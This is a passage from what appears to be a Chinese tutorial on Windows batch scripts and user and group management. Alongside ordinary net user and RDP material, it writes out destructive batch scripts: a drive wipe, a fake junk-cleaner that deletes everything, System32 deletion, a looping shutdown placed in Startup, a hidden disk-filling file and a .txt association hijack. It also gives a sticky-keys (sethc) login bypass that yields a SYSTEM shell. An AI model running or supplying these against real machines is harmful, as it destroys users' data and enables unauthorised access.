%testvariable%</span><br><span class="line">177</span><br></pre></td></tr></table></figure><p>/p经常放在bat脚本中，下面批处理脚本中有用到</p><p><strong>值得注意的是，用set修改环境变量不是永久生效的，只对当前运行窗口有效，关闭运行窗口后，设置就不起作用了</strong></p><table><thead><tr><th>方法</th><th>步骤</th><th>是否立即生效</th></tr></thead><tbody><tr><td>命令行</td><td>set命令</td><td>否</td></tr><tr><td>脚本</td><td></td><td>否</td></tr><tr><td>修改注册表</td><td>如(1)</td><td>否</td></tr><tr><td>设置系统属性</td><td>系统-&gt;属性-&gt;高级-&gt;环境变量</td><td>是</td></tr></tbody></table><h1 id="bat批处理脚本"><a href="#bat批处理脚本" class="headerlink" title="bat批处理脚本"></a>bat批处理脚本</h1><p>批处理的操作就是在该账号弹出一个cmd进行自上而下的命令行操作，操作完成之后exit退出cmd</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e:</span><br><span class="line">cd \</span><br><span class="line">rd . /s/q &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure><p>以上就是一个恶意脚本的内容，删除e盘下的所有内容</p><p>如果想要验证是否是自上而下的命令行操作，可以在中间加入操作pause，会在中途暂停，按任意键后继续</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e:</span><br><span class="line">cd \</span><br><span class="line">pause</span><br><span class="line">rd . /s/q &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301657657.png" alt="image-20220530165727470"></p><p>如果<strong>不想要给受害者看到执行过程，只显示结果</strong>，则在第一行加入<code>@echo off</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">e:</span><br><span class="line">cd \</span><br><span class="line">pause</span><br><span class="line">rd . /s/q &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301700741.png" alt="image-20220530170034668"></p><h2 id="清理脚本"><a href="#清理脚本" class="headerlink" title="清理脚本"></a>清理脚本</h2><p>如果制作一个清理垃圾的脚本，则可以如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">e:</span><br><span class="line">cd \</span><br><span class="line">echo 你好！准备给你清理垃圾..</span><br><span class="line">pause</span><br><span class="line">rd . /s/q &gt;nul 2&gt;nul</span><br><span class="line">echo 你好！已经清理完毕！谢谢使用！</span><br><span class="line">pause# 为了让用户看到这句话，需要加入pause</span><br></pre></td></tr></table></figure><p>接下来我尝试清理在c盘下的test目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">echo ================================</span><br><span class="line">echo 欢迎使用小易清理！</span><br><span class="line">echo ================================</span><br><span class="line">c:</span><br><span class="line">cd \test</span><br><span class="line">echo 你好！准备给你清理垃圾..</span><br><span class="line">pause</span><br><span class="line">rd . /s/q &gt;nul 2&gt;nul</span><br><span class="line">echo 你好！已经清理完毕！谢谢使用！</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301710022.png" alt="image-20220530171052957"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301710530.png" alt="image-20220530171059477"></p><p>当然了可以为了显得高档一点，使用<code>color 0a</code>修改颜色</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301713637.png" alt="image-20220530171308586"></p><p>具体有什么颜色可以使用<code>color ?</code>命令查看</p><p>也可以删除桌面的文件，下面是先通过通配符修改所有文件为txt后缀的文件，然后使用通配符统一删除</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">c:</span><br><span class="line">cd C:\Users\75717\Desktop</span><br><span class="line">ren *.* *.txt</span><br><span class="line">del *.txt</span><br></pre></td></tr></table></figure><h2 id="删除系统脚本"><a href="#删除系统脚本" class="headerlink" title="删除系统脚本"></a>删除系统脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">c:</span><br><span class="line">cd c:\Windows\System32</span><br><span class="line">shutdown -r -f -t 3</span><br><span class="line">attrib -s -h *.*</span><br><span class="line">del *.* &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure><hr><h2 id="关机脚本"><a href="#关机脚本" class="headerlink" title="关机脚本"></a>关机脚本</h2><p>如果想要用户定义关机倒计时，则可以这样写</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">echo ================================</span><br><span class="line">echo 欢迎使用小易关机！</span><br><span class="line">echo ================================</span><br><span class="line">set /p a=请输入你的时间，单位是秒：# /p，说明后面的变量由用户设置,=号后面是提示内容</span><br><span class="line">shutdown -s -f -t %a%</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><h2 id="无限关机脚本"><a href="#无限关机脚本" class="headerlink" title="无限关机脚本"></a>无限关机脚本</h2><p>这是一个写死的无限关机脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">copy shutdown.bat &quot;C:\Users\75717\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span><br><span class="line">shutdown -s -f -t 0</span><br></pre></td></tr></table></figure><p>注意，这里开机启动项，版本不同，位置也不同(并且需要注意操作系统的中英问题)，然后还有用户名不同</p><ul><li>win7/win10：C:\Users\75717\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</li><li>win server 2003：C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</li></ul><p>而高级一点的写法，为了解决用户名不同的问题，有一个userprofile的变量，就是指向运行脚本的用户的家目录</p><p>下面是win10的写法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">copy shutdown.bat &quot;%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span><br><span class="line">shutdown -s -f -t 0</span><br></pre></td></tr></table></figure><h2 id="占用资源脚本"><a href="#占用资源脚本" class="headerlink" title="占用资源脚本"></a>占用资源脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">fsutil file createnew e:\haha.inf 30000000000#30G的文件</span><br><span class="line">attrib +s +h e:\haha.inf     #隐藏该文件</span><br></pre></td></tr></table></figure><h2 id="修改关联性脚本"><a href="#修改关联性脚本" class="headerlink" title="修改关联性脚本"></a>修改关联性脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">assoc .txt=exefile &gt;nul 2&gt;nul</span><br><span class="line">echo 我赌你现在打不开记事本</span><br><span class="line">ping -n 8 127.0.0.1 &gt;nul 2&gt;nul</span><br><span class="line">echo 现在可以了</span><br><span class="line">assoc .txt=txtfile&gt;nul # 这里有个问题，如果txtfile后面有空格的话，这条命令会失败，不知道为什么，所以不要加空格</span><br><span class="line">pause</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="创建用户脚本"><a href="#创建用户脚本" class="headerlink" title="创建用户脚本"></a>创建用户脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">set /p u=请输入您的用户名：</span><br><span class="line">set /p p=请输入您的密码：</span><br><span class="line">net user %u% %p% /add</span><br><span class="line">echo 恭喜你，账户创建成功！</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><h1 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h1><p>vbs弹框</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    msgbox <span class="string">&quot;jason&quot;</span></span><br><span class="line">    msgbox <span class="string">&quot;shuai&quot;</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure><h1 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h1><h2 id="1-0-管理员运行cmd"><a href="#1-0-管理员运行cmd" class="headerlink" title="1.0 管理员运行cmd"></a>1.0 管理员运行cmd</h2><p>首先注意，win 7系统的管理员Administrator是被禁用的，不过初始创建的用户也是管理员用户(权限仅次于真正的管理员大佬Administrator)，所以一般都是用初始账号来当作管理员</p><p><strong>但是win 7系统以及往后所有的windows操作系统，在使用cmd的时候，默认不是管理员运行，哪怕是已经加入了Administrator组</strong>，要右键以管理员身份运行，权限才是管理员，才能用<code>net user</code>等命令,win 2003如果本来就是管理员用户则不用右键</p><hr><p>默认运行cmd</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206062031158.png" alt="image-20220606203157033"></p><p>右键–&gt;以管理员身份运行</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206062032788.png" alt="image-20220606203235691"></p><h2 id="1-1-用户概述"><a href="#1-1-用户概述" class="headerlink" title="1.1 用户概述"></a>1.1 用户概述</h2><ul><li><p>每一个用户登录系统后，拥有不同的操作权限</p></li><li><p>每个账户有自己唯一的SID(安全标识符)</p></li><li><p>不同的账户拥有不同的权限，为不同的账户赋予权限，也就是为不同账户的SID赋予权限</p><p>查看SID值：whoami /user</p><p>账户密码存储位置：<code>c:\windows\system32\config\SAM</code>   可以暴力破解/撞库</p></li><li><p>windows系统上，默认密码最长有效期42天</p></li></ul><h2 id="1-2-内置用户"><a href="#1-2-内置用户" class="headerlink" title="1.2 内置用户"></a>1.2 内置用户</h2><ul><li><p>给人使用的账户：</p><p>administrator    #管理员账户，95%权限</p><p>guest                   #来宾账户，20%权限，一般公用电脑用该身份</p></li><li><p>计算及服务组件相关的系统账号</p><p>system                #系统账户 == 权限至高无上，100%权限</p><p>local services      #本地服务账户 == 权限等于普通用户，50%权限</p><p>network services#网络服务账户 == 权限等于普通用户，50%权限</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011542976.png" alt="image-20220601154222824"></p><p>可以看到用户名的列有系统自己的账号和给人使用的账号打开的进程，系统进程是系统自己的用户打开的，不可轻易删除</p><p>这五个用户都是内置用户，不用创建，系统会自己创建。内置账号是无法删除的</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011548321.png" alt="image-20220601154855212"></p><p>每个用户都有自己的私人物品，和linux的文件夹权限一样，除非是管理员</p><p>比如说不同账号的桌面是不一样的，因为桌面就是属于自己的私人物品(属主是自己，桌面的路径在自己家目录下)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011557754.png" alt="image-20220601155706696"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011557147.png" alt="image-20220601155744088"></p><p>这是两个不同账号的桌面，内容是不一样的，因为jason是管理员账号，可以打开75717的桌面</p><p>而如果是普通用户，打开管理员的文件需要管理员的密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011607104.png" alt="image-20220601160733040"></p><p>而普通用户如果在windows server这种用来搭建服务器的操作系统，是没有权限关机的</p><h2 id="1-3-配置文件"><a href="#1-3-配置文件" class="headerlink" title="1.3 配置文件"></a>1.3 配置文件</h2><p>每个用户都有自己的配置文件（就是linux中的home家目录)，<strong>在用户第一次登录时自动产生</strong>，路径是:</p><p>win7/win10/win2008：c:\用户\</p><p>xp/win2003：                 c:\Documents and Settings\</p><h2 id="1-4-用户管理命令"><a href="#1-4-用户管理命令" class="headerlink" title="1.4 用户管理命令"></a>1.4 用户管理命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user  #查看用户列表</span><br><span class="line">net user 用户名 新密码#改密码</span><br><span class="line">net user 用户名 密码 /add #创建一个新用户</span><br><span class="line">net user 用户名 /del  #删除一个用户</span><br><span class="line">net user 用户名 /active:yes/active:no#激活/禁用账户</span><br></pre></td></tr></table></figure><p>注意，修改密码或者创建、删除、激活、禁用的话，必须要以管理员身份运行cmd，否则</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011930905.png" alt="image-20220601193022773"></p><p>所以一定要以管理员身份运行</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011931977.png" alt="image-20220601193101906"></p><p>接下来就会提示需要管理员密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011931780.png" alt="image-20220601193145704"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011933068.png" alt="image-20220601193304004"></p><h2 id="1-5-远程桌面连接-RDP"><a href="#1-5-远程桌面连接-RDP" class="headerlink" title="1.5 远程桌面连接(RDP)"></a>1.5 远程桌面连接(RDP)</h2><p>端口号3389</p><p>如果想要远程连接windows，下面举个例子讲解</p><ul><li>首先需要关闭主机和服务器机的防火墙</li><li>确保两台机器可以互通</li><li>被连接的服务器打开远程连接功能(可以<code>netstat -an</code>查看3389是否开启)</li></ul><p>win7系统的话这样打开</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010150270.png" alt="image-20220601015047179"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010203859.png" alt="image-20220601020315800"></p><p>框里这两个选项都可以</p><p>win10系统的话，控制面板–&gt;系统–&gt;远程桌面–&gt;启用</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010215294.png" alt="image-20220601021539124"></p><hr><ul><li>得知客户机的用户名与密码</li></ul><p>在win7中右击计算机–&gt;管理–&gt;本地用户和组–&gt;用户</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010218891.png" alt="image-20220601021826833"></p><p>可以看到每个用户的图标不一样，第二个和第三个(Administrator和Guest)的图标有↓的箭头，说明已经被禁用了</p><p>如果想要远程连接win7，就需要知道名称(不是全名)，然后还有密码，密码可以从下图中创建或者更新</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010220271.png" alt="image-20220601022025212"></p><hr><ul><li>获取win7的计算机名称</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\75717&gt;whoami</span><br><span class="line">win-qbf046b1789\75717</span><br><span class="line"></span><br><span class="line">C:\Users\75717&gt;</span><br></pre></td></tr></table></figure><p>其中，<code>win-qbf046b1789</code>就是该计算机的名称</p><ul><li>win10中打开mstsc远程连接</li></ul><p>win+R打开运行，然后输入mstsc</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010221429.png" alt="image-20220601022116378"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010223099.png" alt="image-20220601022344032"></p><p>点击连接</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010224236.png" alt="image-20220601022401159"></p><p>这时候输入jason用户的密码就可以连接上去了，如果用户名不对，点击更多选项就可以修改，点击连接后：</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010224944.png" alt="image-20220601022456886"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010225895.png" alt="image-20220601022519804"></p><p>因为我的虚拟机中已经登录了75717的账户，所以要退出虚拟机中的账户，切换到虚拟机会有提示，点击注销后就可以连接到win7了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010226791.png" alt="image-20220601022638598"></p><p>注意，如果使用非管理员账户登录远程，需要在服务器上将用户加入到远程桌面内置组Remote Desktop Users中，而且所有远程连接都不可以关机！只能注销和断开连接！</p><p>如果不加入内置组的话</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051914813.png" alt="image-20220605191423739"></p><p>添加到内置组的图形办法如下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051911253.png" alt="image-20220605191123089"></p><p>而命令行的办法，可以先查看一下<code>Remote Desktop Users</code>组</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051919137.png" alt="image-20220605191913055"></p><p>可以看到bob是之前在图形界面中添加的，所以如果想要用普通用户远程连接，也可以用命令行把普通用户加入到<code>Remote Desktop Users</code>组就可以了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; 177 /add#把普通用户177加入内置组中，记得加双引号，因为中间有空格</span><br></pre></td></tr></table></figure><h1 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h1><h2 id="2-1组概述"><a href="#2-1组概述" class="headerlink" title="2.1组概述"></a>2.1组概述</h2><p>组的作用：简化权限的赋予。</p><p>赋予权限的方式：</p><ol><li>用户—组—赋予权限</li><li>用户—赋予权限</li></ol><h2 id="2-2内置组"><a href="#2-2内置组" class="headerlink" title="2.2内置组"></a>2.2内置组</h2><p>内置组的权限默认已经被系统赋予。administrator是管理员是因为它属于administrator组的，并不是因为名字是administrator</p><p><strong>所以如果想要让一个用户提权为管理员，只需要把它放进administrator组就可以了</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1)administrator#管理员组</span><br><span class="line">2)guests#来宾组</span><br><span class="line">3)users#普通用户组，默认新建用户都属于该组</span><br><span class="line">4)network#网络配置组</span><br><span class="line">5)print#打印机组</span><br><span class="line">6)Remote Desktop#远程桌面组</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206021821437.png" alt="image-20220602182132298"></p><p>如果想要查看组里面都有谁，比如双击administrator组，可以看到当前的管理员用户有哪些</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206021822218.png" alt="image-20220602182202034"></p><p>如果想要查看某个用户存在的组，比如在用户中双击bob用户，就可以看到该用户隶属于哪个组</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206021824097.png" alt="image-20220602182425966"></p><p>如果服务器老板想要让bob用户管理网络配置这一块，但是又不想让它能得到管理员权限，就把bob分配到network网络配置组，这样的话bob就有user组和network组的权限，两者是叠加的。</p><h2 id="2-3创建组-加入用户"><a href="#2-3创建组-加入用户" class="headerlink" title="2.3创建组/加入用户"></a>2.3创建组/加入用户</h2><h3 id="图形化添加"><a href="#图形化添加" class="headerlink" title="图形化添加"></a>图形化添加</h3><p>右键计算机–&gt;管理–&gt;本地用户和组–&gt;组–&gt;右键新建组</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206030201610.png" alt="image-20220603020145475"></p><p>组命名为：jason177，把177用户放进该组里</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206030203433.png" alt="image-20220603020317333"></p><p>再去到用户那里，右键177–&gt;属性,可以看到177用户隶属于那些组</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206030204644.png" alt="image-20220603020412546"></p><h3 id="命令行添加"><a href="#命令行添加" class="headerlink" title="命令行添加"></a>命令行添加</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net localgroup#列出所有的组</span><br><span class="line">net localgroup 组名 /add       #添加组</span><br><span class="line">net localgroup 组名   #查看成员</span><br><span class="line">net localgroup 组名 用户名 /add   #把用户添加到组里</span><br><span class="line">net localgroup 组名 用户名 /del   #把用户从组里移除</span><br><span class="line">net localgroup 组名 /del         #把组删除</span><br></pre></td></tr></table></figure><p>这里创建一个组为bobgroup，然后把bob用户添加进来(<strong>注意，这里一定要以管理员运行cmd</strong>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建组</span></span><br><span class="line">C:\Windows\system32&gt;net localgroup bobgroup /add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net localgroup</span><br><span class="line"></span><br><span class="line">\\WIN-QBF046B1789 的别名</span><br><span class="line"></span><br><span class="line">-------------------------------------------------</span><br><span class="line">*Administrators</span><br><span class="line">*Backup Operators</span><br><span class="line">*bobgroup</span><br><span class="line">...</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">添加用户到组里</span></span><br><span class="line">C:\Windows\system32&gt;net localgroup bobgroup bob /add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net localgroup bobgroup</span><br><span class="line">别名     bobgroup</span><br><span class="line">注释</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">----------------------------------------------------</span><br><span class="line">bob</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注意：用户千万不能移除出原来的users组，哪怕是加入了administrator组，也不能从users组中移除，否则会登录不了该操作系统，用户的本职组必须要保留。</strong></p><h3 id="赋予权限"><a href="#赋予权限" class="headerlink" title="赋予权限"></a>赋予权限</h3><p>赋予权限的话就是在某个文件夹或者磁盘或者文件，右键属性–&gt;安全，就可以把权限给到任意组</p><h1 id="Shift漏洞"><a href="#Shift漏洞" class="headerlink" title="Shift漏洞"></a>Shift漏洞</h1><p>这里注意在win7和win10没有进入系统时,可以通过系统修复<em>漏洞</em>篡改文件名进入系统。(若已修补漏洞则无法利用)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">案例：破解win7系统密码</span><br><span class="line">实验步骤</span><br><span class="line">1、开启win7虚拟机的时候出现windows启动界面时强制关机；</span><br><span class="line">2、再开机，出现&quot;启动修复(推荐)&quot;及选择该项；# 如未出现，则多尝试几次，还是不行的话就换其它方法</span><br><span class="line">3、出现系统还原提示，点击取消，等待几分钟，出现问题原因，点击查看详细信息；</span><br><span class="line">4、打开最后一个链接，即一个记事本；</span><br><span class="line">5、然后在记事本左上方点击打开文件，选择显示所有文件；</span><br><span class="line">6、找到sethc并改名其他名字，再找到cmd，改名为sethc；</span><br><span class="line">7、全部关闭，点击完成；</span><br><span class="line">8、然后重新开机后，连续按5次shift，将会弹出cmd工具，使用命令net user 用户名 新密码，就可以将当前用户的密码修改；</span><br><span class="line">9、或者另外建立一个用户，并提升为管理员，注销后，可再删除新建的用户，这样的好处是不修改当前用户的密码即可登录系统；</span><br></pre></td></tr></table></figure><hr><p>出现主界面时，点击”关闭客户机”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020337677.png" alt="image-20220602033741413"></p><p>关闭之后重新开机，就会出现如下错误修复，选择”启动修复(推荐)”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020338471.png" alt="image-20220602033819337"></p><p>然后在启动修复的主界面提示”你想使用系统还原还原计算机吗？”，点击取消</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020339421.png" alt="image-20220602033929220"></p><p>过了几分钟左右，提示”启动修复无法自动修复此计算机”，点击”查看问题详细信息”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020340536.png" alt="image-20220602034007425"></p><p>下拉到最后，点击最后一个链接，就是一个记事本，打开之后点击左上角的”文件”，选择”打开”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020341242.png" alt="image-20220602034137059"></p><p>然后进入到C盘系统盘(注意这里可能会有混淆视听的操作，C盘不一定是真正的C盘，有可能是当前的D、E盘才是真正的C盘)</p><p>C盘–&gt;windows–&gt;system32，然后在文件类型中选择”所有文件”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020343339.png" alt="image-20220602034356124"></p><p>然后选择一个文件或者文件夹，按s键查找s开头的文件，找到真正的”sethc”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020344271.png" alt="image-20220602034443169"></p><p>修改该sethc名字为任意一个名字，然后找到cmd，修改名字为”sethc”，这样下次调用”sethc”，系统就会误以为cmd是”sethc”从而打开cmd</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020346719.png" alt="image-20220602034608613"></p><p>做完这个操作之后，关闭所有弹框，点击完成，然后系统自动关机。然后开机之后就会来到登录界面</p><p>然后按5次shift</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020348662.png" alt="image-20220602034829475"></p><p>可以看到打开了名字为”sethc”，实则是cmd的命令行终端，并且因为我们还没有登录任何用户，所以系统不知道我们是哪个用户，就把我们当成了system账户，也就是之前说的系统账户，比管理员账户的权限还要高。</p><p>这里就可以创建用户、修改用户密码等操作了</p><hr><p>这里尝试一下创建一个新用户，然后加入管理员组</p><p>按很多次shift键，启动了cmd之后</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206030249775.png" alt="image-20220603024905679"></p><p>然后重启<code>shutdown -r -f -t 0</code></p><p>因为没给testadmin创建密码，所以点击头像就可以直接登录到系统了</p><p>进入到系统之后可以随意查看任意文件，包括其他管理员的文件</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206030250514.png" alt="image-20220603025051423"></p><h1 id="和goto"><a href="#和goto" class="headerlink" title=":和goto"></a>:和goto</h1><p><code>:</code>是用来定义区块的，<code>goto</code>是用来跳转的，其实就是相当于定义函数吧。因为本来bat是自上而下运行的，加入了<code>:</code>就可以像函数一样使用</p><p><code>: + goto + 判断</code>是经常使用的一种方法</p><p>案例1：小程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title xiaochengxu</span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo =============</span><br><span class="line">echo 输入1：关机</span><br><span class="line">echo 输入2：创建账户</span><br><span class="line">echo 输入3：退出</span><br><span class="line">echo =============</span><br><span class="line"></span><br><span class="line">set /p value=请输入：</span><br><span class="line">if %value%=1 goto a</span><br><span class="line">if %value%=2 goto b</span><br><span class="line">if %value%=3 goto 